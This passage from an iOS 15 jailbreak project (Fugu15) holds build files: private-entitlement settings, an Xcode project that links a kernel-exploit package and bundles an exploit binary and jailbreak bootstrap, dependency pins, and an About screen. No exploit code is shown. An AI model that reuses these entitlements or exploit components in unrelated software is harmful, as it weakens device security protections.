	<key>com.apple.private.security.disk-device-access</key>
	<true/>
	<key>com.apple.private.vfs.snapshot</key>
	<true/>
	<key>com.apple.security.network.client</key>
	<true/>
	<key>com.apple.security.network.server</key>
	<true/>
	<key>com.apple.rootless.volume.Update</key>
	<true/>
	<key>com.apple.private.security.system-mount-authority</key>
	<true/>
	<key>com.apple.system-task-ports.control</key>
	<true/>
	<key>com.apple.private.spawn-subsystem-root</key>
	<true/>
	<key>com.apple.system-task-ports.token.control</key>
	<true/>
	<key>com.apple.developer.driverkit</key>
	<true/>
	<key>com.apple.developer.driverkit.transport.pci</key>
	<true/>
	<key>com.apple.developer.driverkit.builtin</key>
	<true/>
	<key>com.apple.developer.driverkit.transport.pci.offloadEngineDisable</key>
	<true/>
</dict>
</plist>

```

`Fugu15/Fugu15.xcodeproj/project.pbxproj`:

```pbxproj
// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 56;
	objects = {

/* Begin PBXBuildFile section */
		1502A40C2891B03F0011CB6E /* Fugu15App.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1502A40B2891B03F0011CB6E /* Fugu15App.swift */; };
		1502A40E2891B03F0011CB6E /* ContentView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1502A40D2891B03F0011CB6E /* ContentView.swift */; };
		1502A4102891B0410011CB6E /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 1502A40F2891B0410011CB6E /* Assets.xcassets */; };
		1502A4132891B0410011CB6E /* Preview Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 1502A4122891B0410011CB6E /* Preview Assets.xcassets */; };
		1502A4242891BD800011CB6E /* Fugu15KernelExploit in Frameworks */ = {isa = PBXBuildFile; productRef = 1502A4232891BD800011CB6E /* Fugu15KernelExploit */; };
		1502A4262891BE320011CB6E /* oobPCI in Resources */ = {isa = PBXBuildFile; fileRef = 1502A4252891BE320011CB6E /* oobPCI */; };
		151CAFA2289348E200B2A6BA /* RemoveFuguInstall.swift in Sources */ = {isa = PBXBuildFile; fileRef = 151CAFA1289348E200B2A6BA /* RemoveFuguInstall.swift */; };
		151CAFAD2893645C00B2A6BA /* CoreServices.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 151CAFAC2893645C00B2A6BA /* CoreServices.framework */; };
		151CAFAF28936D4B00B2A6BA /* JailbreakView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 151CAFAE28936D4B00B2A6BA /* JailbreakView.swift */; };
		151CAFB128936DE800B2A6BA /* LogView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 151CAFB028936DE800B2A6BA /* LogView.swift */; };
		151CAFB32894041D00B2A6BA /* main.swift in Sources */ = {isa = PBXBuildFile; fileRef = 151CAFB22894041D00B2A6BA /* main.swift */; };
		151CAFB52894070300B2A6BA /* AboutView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 151CAFB42894070300B2A6BA /* AboutView.swift */; };
		15372EA228DDF5EF00514A73 /* TrustCache in Resources */ = {isa = PBXBuildFile; fileRef = 15372E9F28DDF5EF00514A73 /* TrustCache */; };
		15372EA328DDF5EF00514A73 /* bootstrap.tar in Resources */ = {isa = PBXBuildFile; fileRef = 15372EA028DDF5EF00514A73 /* bootstrap.tar */; };
		15372EA428DDF5EF00514A73 /* tar in Resources */ = {isa = PBXBuildFile; fileRef = 15372EA128DDF5EF00514A73 /* tar */; };
		15372EA628DDFF9000514A73 /* sileo.deb in Frameworks */ = {isa = PBXBuildFile; fileRef = 15372EA528DDFF9000514A73 /* sileo.deb */; };
		15372EA728DDFF9A00514A73 /* sileo.deb in Resources */ = {isa = PBXBuildFile; fileRef = 15372EA528DDFF9000514A73 /* sileo.deb */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		1502A4082891B03F0011CB6E /* Fugu15.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Fugu15.app; sourceTree = BUILT_PRODUCTS_DIR; };
		1502A40B2891B03F0011CB6E /* Fugu15App.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Fugu15App.swift; sourceTree = "<group>"; };
		1502A40D2891B03F0011CB6E /* ContentView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContentView.swift; sourceTree = "<group>"; };
		1502A40F2891B0410011CB6E /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		1502A4122891B0410011CB6E /* Preview Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = "Preview Assets.xcassets"; sourceTree = "<group>"; };
		1502A41B2891B0980011CB6E /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist; path = Info.plist; sourceTree = "<group>"; };
		1502A41C2891B1260011CB6E /* posix_spawn.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = posix_spawn.h; sourceTree = "<group>"; };
		1502A41D2891B1360011CB6E /* Fugu15-Bridging-Header.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "Fugu15-Bridging-Header.h"; sourceTree = "<group>"; };
		1502A4212891BD790011CB6E /* Fugu15KernelExploit */ = {isa = PBXFileReference; lastKnownFileType = wrapper; name = Fugu15KernelExploit; path = ../Packages/Fugu15KernelExploit; sourceTree = "<group>"; };
		1502A4252891BE320011CB6E /* oobPCI */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.executable"; name = oobPCI; path = ../Exploits/oobPCI/oobPCI; sourceTree = "<group>"; };
		1502A4292891BF0A0011CB6E /* Fugu15.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = Fugu15.entitlements; sourceTree = "<group>"; };
		1502A42A2891BF130011CB6E /* Makefile */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.make; path = Makefile; sourceTree = "<group>"; };
		151CAFA1289348E200B2A6BA /* RemoveFuguInstall.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = RemoveFuguInstall.swift; sourceTree = "<group>"; };
		151CAFA42893622C00B2A6BA /* _LSApplicationState.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = _LSApplicationState.h; sourceTree = "<group>"; };
		151CAFA52893622C00B2A6BA /* LSApplicationProxy.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = LSApplicationProxy.h; sourceTree = "<group>"; };
		151CAFA62893622C00B2A6BA /* LSApplicationWorkspace.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = LSApplicationWorkspace.h; sourceTree = "<group>"; };
		151CAFA72893622C00B2A6BA /* LSBundleProxy.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = LSBundleProxy.h; sourceTree = "<group>"; };
		151CAFAC2893645C00B2A6BA /* CoreServices.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = CoreServices.framework; path = System/Library/Frameworks/CoreServices.framework; sourceTree = SDKROOT; };
		151CAFAE28936D4B00B2A6BA /* JailbreakView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = JailbreakView.swift; sourceTree = "<group>"; };
		151CAFB028936DE800B2A6BA /* LogView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LogView.swift; sourceTree = "<group>"; };
		151CAFB22894041D00B2A6BA /* main.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = main.swift; sourceTree = "<group>"; };
		151CAFB42894070300B2A6BA /* AboutView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AboutView.swift; sourceTree = "<group>"; };
		15372E9F28DDF5EF00514A73 /* TrustCache */ = {isa = PBXFileReference; lastKnownFileType = file; path = TrustCache; sourceTree = "<group>"; };
		15372EA028DDF5EF00514A73 /* bootstrap.tar */ = {isa = PBXFileReference; lastKnownFileType = archive.tar; path = bootstrap.tar; sourceTree = "<group>"; };
		15372EA128DDF5EF00514A73 /* tar */ = {isa = PBXFileReference; lastKnownFileType = "compiled.mach-o.executable"; path = tar; sourceTree = "<group>"; };
		15372EA528DDFF9000514A73 /* sileo.deb */ = {isa = PBXFileReference; lastKnownFileType = archive.ar; path = sileo.deb; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		1502A4052891B03F0011CB6E /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				1502A4242891BD800011CB6E /* Fugu15KernelExploit in Frameworks */,
				15372EA628DDFF9000514A73 /* sileo.deb in Frameworks */,
				151CAFAD2893645C00B2A6BA /* CoreServices.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		1502A3FF2891B03F0011CB6E = {
			isa = PBXGroup;
			children = (
				1502A4252891BE320011CB6E /* oobPCI */,
				1502A4212891BD790011CB6E /* Fugu15KernelExploit */,
				1502A42A2891BF130011CB6E /* Makefile */,
				1502A40A2891B03F0011CB6E /* Fugu15 */,
				1502A4092891B03F0011CB6E /* Products */,
				151CAFAB2893645C00B2A6BA /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		1502A4092891B03F0011CB6E /* Products */ = {
			isa = PBXGroup;
			children = (
				1502A4082891B03F0011CB6E /* Fugu15.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		1502A40A2891B03F0011CB6E /* Fugu15 */ = {
			isa = PBXGroup;
			children = (
				15372E9E28DDF5D300514A73 /* bootstrap */,
				1502A41B2891B0980011CB6E /* Info.plist */,
				1502A40B2891B03F0011CB6E /* Fugu15App.swift */,
				1502A40D2891B03F0011CB6E /* ContentView.swift */,
				151CAFAE28936D4B00B2A6BA /* JailbreakView.swift */,
				151CAFB028936DE800B2A6BA /* LogView.swift */,
				151CAFB42894070300B2A6BA /* AboutView.swift */,
				151CAFA1289348E200B2A6BA /* RemoveFuguInstall.swift */,
				151CAFB22894041D00B2A6BA /* main.swift */,
				1502A40F2891B0410011CB6E /* Assets.xcassets */,
				1502A4112891B0410011CB6E /* Preview Content */,
				151CAFA32893621300B2A6BA /* include */,
				1502A41D2891B1360011CB6E /* Fugu15-Bridging-Header.h */,
				1502A4292891BF0A0011CB6E /* Fugu15.entitlements */,
			);
			path = Fugu15;
			sourceTree = "<group>";
		};
		1502A4112891B0410011CB6E /* Preview Content */ = {
			isa = PBXGroup;
			children = (
				1502A4122891B0410011CB6E /* Preview Assets.xcassets */,
			);
			path = "Preview Content";
			sourceTree = "<group>";
		};
		151CAFA32893621300B2A6BA /* include */ = {
			isa = PBXGroup;
			children = (
				151CAFA42893622C00B2A6BA /* _LSApplicationState.h */,
				151CAFA52893622C00B2A6BA /* LSApplicationProxy.h */,
				151CAFA62893622C00B2A6BA /* LSApplicationWorkspace.h */,
				151CAFA72893622C00B2A6BA /* LSBundleProxy.h */,
				1502A41C2891B1260011CB6E /* posix_spawn.h */,
			);
			path = include;
			sourceTree = "<group>";
		};
		151CAFAB2893645C00B2A6BA /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				151CAFAC2893645C00B2A6BA /* CoreServices.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
		15372E9E28DDF5D300514A73 /* bootstrap */ = {
			isa = PBXGroup;
			children = (
				15372EA528DDFF9000514A73 /* sileo.deb */,
				15372EA028DDF5EF00514A73 /* bootstrap.tar */,
				15372EA128DDF5EF00514A73 /* tar */,
				15372E9F28DDF5EF00514A73 /* TrustCache */,
			);
			path = bootstrap;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		1502A4072891B03F0011CB6E /* Fugu15 */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 1502A4162891B0410011CB6E /* Build configuration list for PBXNativeTarget "Fugu15" */;
			buildPhases = (
				1502A4042891B03F0011CB6E /* Sources */,
				1502A4052891B03F0011CB6E /* Frameworks */,
				1502A4062891B03F0011CB6E /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = Fugu15;
			packageProductDependencies = (
				1502A4232891BD800011CB6E /* Fugu15KernelExploit */,
			);
			productName = Fugu15;
			productReference = 1502A4082891B03F0011CB6E /* Fugu15.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		1502A4002891B03F0011CB6E /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1400;
				LastUpgradeCheck = 1400;
				TargetAttributes = {
					1502A4072891B03F0011CB6E = {
						CreatedOnToolsVersion = 14.0;
						LastSwiftMigration = 1400;
					};
				};
			};
			buildConfigurationList = 1502A4032891B03F0011CB6E /* Build configuration list for PBXProject "Fugu15" */;
			compatibilityVersion = "Xcode 14.0";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 1502A3FF2891B03F0011CB6E;
			productRefGroup = 1502A4092891B03F0011CB6E /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				1502A4072891B03F0011CB6E /* Fugu15 */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		1502A4062891B03F0011CB6E /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				15372EA728DDFF9A00514A73 /* sileo.deb in Resources */,
				15372EA428DDF5EF00514A73 /* tar in Resources */,
				15372EA228DDF5EF00514A73 /* TrustCache in Resources */,
				1502A4262891BE320011CB6E /* oobPCI in Resources */,
				1502A4132891B0410011CB6E /* Preview Assets.xcassets in Resources */,
				15372EA328DDF5EF00514A73 /* bootstrap.tar in Resources */,
				1502A4102891B0410011CB6E /* Assets.xcassets in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		1502A4042891B03F0011CB6E /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				151CAFB52894070300B2A6BA /* AboutView.swift in Sources */,
				1502A40E2891B03F0011CB6E /* ContentView.swift in Sources */,
				151CAFB32894041D00B2A6BA /* main.swift in Sources */,
				151CAFB128936DE800B2A6BA /* LogView.swift in Sources */,
				1502A40C2891B03F0011CB6E /* Fugu15App.swift in Sources */,
				151CAFAF28936D4B00B2A6BA /* JailbreakView.swift in Sources */,
				151CAFA2289348E200B2A6BA /* RemoveFuguInstall.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin XCBuildConfiguration section */
		1502A4142891B0410011CB6E /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++17";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		1502A4152891B0410011CB6E /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++17";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 16.0;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		1502A4172891B0410011CB6E /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CLANG_ENABLE_MODULES = YES;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_ASSET_PATHS = "\"Fugu15/Preview Content\"";
				DEVELOPMENT_TEAM = 3ZQ6958H75;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = Fugu15/Info.plist;
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortraitUpsideDown";
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				LIBRARY_SEARCH_PATHS = (
					"$(inherited)",
					"$(PROJECT_DIR)/Fugu15/bootstrap",
				);
				MARKETING_VERSION = 1.0;
				OTHER_LDFLAGS = (
					"-framework",
					IOKit,
				);
				PRODUCT_BUNDLE_IDENTIFIER = de.pinauten.Fugu15;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_OBJC_BRIDGING_HEADER = "Fugu15/Fugu15-Bridging-Header.h";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		1502A4182891B0410011CB6E /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CLANG_ENABLE_MODULES = YES;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_ASSET_PATHS = "\"Fugu15/Preview Content\"";
				DEVELOPMENT_TEAM = 3ZQ6958H75;
				ENABLE_PREVIEWS = YES;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = Fugu15/Info.plist;
				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortraitUpsideDown";
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				LIBRARY_SEARCH_PATHS = (
					"$(inherited)",
					"$(PROJECT_DIR)/Fugu15/bootstrap",
				);
				MARKETING_VERSION = 1.0;
				OTHER_LDFLAGS = (
					"-framework",
					IOKit,
				);
				PRODUCT_BUNDLE_IDENTIFIER = de.pinauten.Fugu15;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_OBJC_BRIDGING_HEADER = "Fugu15/Fugu15-Bridging-Header.h";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		1502A4032891B03F0011CB6E /* Build configuration list for PBXProject "Fugu15" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				1502A4142891B0410011CB6E /* Debug */,
				1502A4152891B0410011CB6E /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		1502A4162891B0410011CB6E /* Build configuration list for PBXNativeTarget "Fugu15" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				1502A4172891B0410011CB6E /* Debug */,
				1502A4182891B0410011CB6E /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCSwiftPackageProductDependency section */
		1502A4232891BD800011CB6E /* Fugu15KernelExploit */ = {
			isa = XCSwiftPackageProductDependency;
			productName = Fugu15KernelExploit;
		};
/* End XCSwiftPackageProductDependency section */
	};
	rootObject = 1502A4002891B03F0011CB6E /* Project object */;
}

```

`Fugu15/Fugu15.xcodeproj/project.xcworkspace/contents.xcworkspacedata`:

```xcworkspacedata
<?xml version="1.0" encoding="UTF-8"?>
<Workspace
   version = "1.0">
   <FileRef
      location = "self:">
   </FileRef>
</Workspace>

```

`Fugu15/Fugu15.xcodeproj/project.xcworkspace/xcshareddata/IDEWorkspaceChecks.plist`:

```plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>IDEDidComputeMac32BitWarning</key>
	<true/>
</dict>
</plist>

```

`Fugu15/Fugu15.xcodeproj/project.xcworkspace/xcshareddata/swiftpm/Package.resolved`:

```resolved
{
  "object": {
    "pins": [
      {
        "package": "iDownload",
        "repositoryURL": "https://github.com/pinauten/iDownload",
        "state": {
          "branch": "master",
          "revision": "62920e864f06af4b0a50a0aa9b6e0a7c7bd83a6f",
          "version": null
        }
      },
      {
        "package": "KernelPatchfinder",
        "repositoryURL": "https://github.com/pinauten/KernelPatchfinder",
        "state": {
          "branch": "master",
          "revision": "f53a9e7a15d6fa4afdb447838ff7a65892d52a82",
          "version": null
        }
      },
      {
        "package": "PatchfinderUtils",
        "repositoryURL": "https://github.com/pinauten/PatchfinderUtils",
        "state": {
          "branch": "master",
          "revision": "8f9d9fb3afa8e745f477f9612464e51b463e8975",
          "version": null
        }
      },
      {
        "package": "SwiftMachO",
        "repositoryURL": "https://github.com/pinauten/SwiftMachO",
        "state": {
          "branch": "master",
          "revision": "d433b349d7e69bb8fd5d18ea5cdbcd8b731ddf55",
          "version": null
        }
      },
      {
        "package": "SwiftUtils",
        "repositoryURL": "https://github.com/pinauten/SwiftUtils",
        "state": {
          "branch": "master",
          "revision": "1d37faabb4c58b3152394c9b6e1c1a68507646b9",
          "version": null
        }
      }
    ]
  },
  "version": 1
}

```

`Fugu15/Fugu15/AboutView.swift`:

```swift
//
//  AboutView.swift
//  Fugu15
//
//  Created by Linus Henze on 2022-07-29.
//

import SwiftUI

struct AboutView: View {
    @Environment(\.openURL) var openURL
    
    @State private var descriptionMaxWidth: CGFloat?
    
    struct DescriptionWidthPreferenceKey: PreferenceKey {
        static let defaultValue: CGFloat = 0

        static func reduce(value: inout CGFloat, nextValue: () -> CGFloat) {
            value = max(value, nextValue())
        }
    }
    
    var body: some View {
        VStack(alignment: .center) {
            Image("FuguIcon")
                .resizable()
                .cornerRadius(22.37)
                .padding()
                .aspectRatio(contentMode: .fit)
                .frame(width: UIScreen.main.bounds.size.width/3)
                .shadow(radius: 10)
            
            HStack(alignment: .center) {
                VStack(alignment: .leading) {
                    Text("Fugu15 Jailbreak Tool")
                        .font(.largeTitle)
                        .fontWeight(.heavy)
                        .foregroundColor(.accentColor)
                        .background(
                            GeometryReader(content: { geometry in
                                Color.clear.preference(
                                    key: DescriptionWidthPreferenceKey.self,
                                    value: geometry.size.width
                                )
                            })
                        )
                        .padding(.bottom)
                    
                    Text("Fugu15 is an (incomplete) Jailbreak for iOS 15.0 - 15.4.1, supporting iPhone XS and newer.")
                        .multilineTextAlignment(.center)
                        .frame(width: descriptionMaxWidth)
                }
                    .onPreferenceChange(DescriptionWidthPreferenceKey.self) {
                        descriptionMaxWidth = $0
                    }
            }.padding(.bottom)
            
            //
            // You should change the links below if you make any changes to Fugu15
            // so that others know where to find the source code
            //
            Link("Source Code", destination: URL(string: "https://github.com/pinauten/Fugu15")!)
                .padding([.top, .leading, .trailing])
            Link("License", destination: URL(string: "https://github.com/pinauten/Fugu15/LICENSE")!)
                .padding([.top, .leading, .trailing])
            Link("Credits", destination: URL(string: "https://github.com/pinauten/Fugu15/blob/master/README.md#Credits")!)
                .padding([.top, .leading, .trailing])
            
            Spacer()
            
            Group {
                Image("PinautenLogo")
                    .resizable()
                    .aspectRatio(contentMode: .fit)
                    .padding(.leading, 100)
                    .padding(.trailing, 100)
                    .padding(.bottom)
                    .frame(maxHeight: 100)
                    .onTapGesture {
                        openURL(URL(string: "https://pinauten.de/")!)
                    }
            }.padding(.bottom, 25)
        }
    }
}

